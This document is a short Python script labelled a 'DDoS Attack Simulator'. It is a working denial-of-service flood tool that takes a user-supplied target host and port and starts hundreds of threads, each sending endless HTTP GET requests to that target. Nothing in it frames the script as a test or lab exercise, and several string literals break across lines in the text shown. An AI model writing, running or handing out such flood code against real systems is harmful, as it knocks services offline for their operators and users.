import threading
import socket
import time

print("DDoS Attack Simulator")

target_domain = input("Enter target domain/IP: ")
target_port = int(input("Enter target port: "))

attack_threads = int(input("Enter number of attack threads (500-1000 recommended): "))

print(f"
Attacking {target_domain}:{target_port} with {attack_threads} threads...")

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_domain, target_port))
            s.send(b"GET / HTTP/1.1\r
Host: "+bytes(target_domain, 'utf-8')+b"\r
\r
")
            s.close()
        except socket.error:
            pass

start_time = time.time()

for i in range(attack_threads):
    thread = threading.Thread(target=attack)
    thread.start()

while True:
    elapsed_time = time.time() - start_time
    print(f"\rAttack elapsed time: {elapsed_time:.2f} seconds", end="")
